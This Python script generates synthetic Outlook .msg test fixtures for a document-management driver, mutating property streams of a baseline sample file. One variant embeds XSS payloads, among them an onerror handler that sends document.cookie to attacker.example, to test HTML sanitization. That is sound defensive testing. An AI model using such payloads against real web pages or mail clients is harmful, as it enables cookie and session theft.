"""Generate synthetic .msg test fixtures for the Day 2 .msg driver test.

Source attribution:
- Baseline file `strangeDate.msg` is taken verbatim from the extract-msg
  project's own `example-msg-files/` test corpus
  (https://raw.githubusercontent.com/TeamMsgExtractor/msg-extractor/master/example-msg-files/strangeDate.msg).
  It is synthetic test data created by the extract-msg maintainer, distributed
  with the GPL-3.0-licensed library, designed precisely for the kind of driver
  testing we are doing here. No real .msg files from anyone's inbox.
- Variants are produced by mutating specific OLE2 property streams of the
  baseline file using `extract_msg.ole_writer.OleWriter`. Stream identifiers
  follow the MS-OXMSG property-tag spec
  (https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxmsg/).

Variant matrix (each tests a different code path in the driver):
  plain_short.msg     plain-text body, short — baseline body extraction
  plain_long.msg      plain-text body, > 16 KB — tests body truncation
  hostile_html.msg    htmlBody with <script>, onerror=, javascript: — tests
                      nh3 sanitization whitelist
  unicode_body.msg    plain body with non-ASCII characters — tests
                      encoding-tolerant body resolution
  minimal.msg         body stream removed — tests graceful absence
  (plus baseline strangeDate.msg)

Run inside the Mayan container where extract_msg is installed:
  docker compose exec --user=mayan app /opt/mayan-edms/bin/python \\
      /opt/mayan-extensions/_generate_synthetic_msg.py

Outputs land under /tmp/synthetic_msg/ in-container; the calling script
then docker-cp's them out to ./samples_msg/.
"""

from __future__ import annotations

import sys
from pathlib import Path

import extract_msg
from extract_msg.ole_writer import OleWriter

# MS-OXMSG property-tag streams. Suffix `001F` = PT_UNICODE (UTF-16-LE),
# `0102` = PT_BINARY.
STREAM_SUBJECT = '__substg1.0_0037001F'      # PR_SUBJECT_W
STREAM_BODY = '__substg1.0_1000001F'          # PR_BODY_W
STREAM_HTML_BODY_UNICODE = '__substg1.0_1013001F'  # PR_BODY_HTML_W
STREAM_HTML_BODY_BINARY = '__substg1.0_10130102'   # PR_BODY_HTML (utf-8 bytes)


def _utf16(s: str) -> bytes:
    return s.encode('utf-16-le')


def _load_baseline(source: Path) -> tuple[OleWriter, extract_msg.MSGFile]:
    msg = extract_msg.Message(str(source))
    ow = OleWriter()
    ow.fromMsg(msg)
    return ow, msg


def _has_entry(ow: OleWriter, path: list[str]) -> bool:
    try:
        ow.getEntry(path)
        return True
    except OSError:
        return False


def _set_stream(ow: OleWriter, stream_name: str, data: bytes) -> None:
    """Write data to a stream — edit if present, add if not."""
    if _has_entry(ow, [stream_name]):
        ow.editEntry([stream_name], data=data)
    else:
        ow.addEntry([stream_name], data=data)


def _remove_stream(ow: OleWriter, stream_name: str) -> None:
    if _has_entry(ow, [stream_name]):
        ow.deleteEntry([stream_name])


def variant_plain_short(source: Path, dest: Path) -> None:
    ow, _ = _load_baseline(source)
    body = (
        'Synthetic POC email body. Short plain text.\r\n'
        'Client: ACME-CORP\r\nMatter: 2025-001\r\n'
    )
    _set_stream(ow, STREAM_BODY, _utf16(body))
    _set_stream(ow, STREAM_SUBJECT, _utf16('POC short plain body'))
    ow.write(str(dest))


def variant_plain_long(source: Path, dest: Path) -> None:
    ow, _ = _load_baseline(source)
    # 20 KB body — exceeds the driver's 16 KB cap to verify truncation.
    chunk = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. '
    body = (chunk * 400)[:20480]
    _set_stream(ow, STREAM_BODY, _utf16(body))
    _set_stream(ow, STREAM_SUBJECT, _utf16('POC oversized body'))
    ow.write(str(dest))


def variant_hostile_html(source: Path, dest: Path) -> None:
    """HTML body with payloads nh3 must strip:
       - <script> tags
       - inline event handlers (onerror, onclick)
       - javascript: URLs
       - <iframe> and <style> tags
       - leftover formatting (<b>, <a href>) should be retained."""
    ow, _ = _load_baseline(source)
    hostile = (
        '<html><body>'
        '<script>alert("XSS payload via script tag")</script>'
        '<img src="x" onerror="window.location=\'https://attacker.example/steal?c=\'+document.cookie">'
        '<iframe src="javascript:alert(1)"></iframe>'
        '<style>body{background:url(javascript:alert(2))}</style>'
        '<a href="javascript:evil()" onclick="evil()">click me</a>'
        '<p><b>Legitimate</b> formatting: contract review for <a href="https://example.com/matter/2025-001">matter 2025-001</a>.</p>'
        '<p>This text body is preserved; the hostile bits should be stripped by nh3.</p>'
        '</body></html>'
    )
    # Set both unicode and binary HTML streams to maximize compatibility.
    _set_stream(ow, STREAM_HTML_BODY_UNICODE, _utf16(hostile))
    _set_stream(ow, STREAM_HTML_BODY_BINARY, hostile.encode('utf-8'))
    # Remove plain-text body so the driver is forced down the HTML path.
    _remove_stream(ow, STREAM_BODY)
    _set_stream(ow, STREAM_SUBJECT, _utf16('POC hostile HTML body'))
    ow.write(str(dest))


def variant_unicode_body(source: Path, dest: Path) -> None:
    ow, _ = _load_baseline(source)
    body = (
        'Synthetic unicode test body.\r\n'
        'Umlauts: Müller, Köln, Düsseldorf.\r\n'
        'Accents: café, résumé, naïve.\r\n'
        'CJK: 法律 文书 (legal documents in CJK).\r\n'
        'Symbols: € £ ¥ — § ¶.\r\n'
    )
    _set_stream(ow, STREAM_BODY, _utf16(body))
    _set_stream(ow, STREAM_SUBJECT, _utf16('POC unicode body'))
    ow.write(str(dest))


def variant_minimal(source: Path, dest: Path) -> None:
    ow, _ = _load_baseline(source)
    _remove_stream(ow, STREAM_BODY)
    _remove_stream(ow, STREAM_HTML_BODY_UNICODE)
    _remove_stream(ow, STREAM_HTML_BODY_BINARY)
    _set_stream(ow, STREAM_SUBJECT, _utf16('POC minimal (no body)'))
    ow.write(str(dest))


def main(source_path: str, dest_dir: str) -> int:
    source = Path(source_path)
    dest = Path(dest_dir)
    dest.mkdir(parents=True, exist_ok=True)

    variants = [
        ('plain_short.msg', variant_plain_short),
        ('plain_long.msg', variant_plain_long),
        ('hostile_html.msg', variant_hostile_html),
        ('unicode_body.msg', variant_unicode_body),
        ('minimal.msg', variant_minimal),
    ]

    for name, fn in variants:
        out = dest / name
        fn(source, out)
        print(f'  wrote {out.name}: {out.stat().st_size} bytes')
    return 0


if __name__ == '__main__':
    sys.exit(main(sys.argv[1], sys.argv[2]))
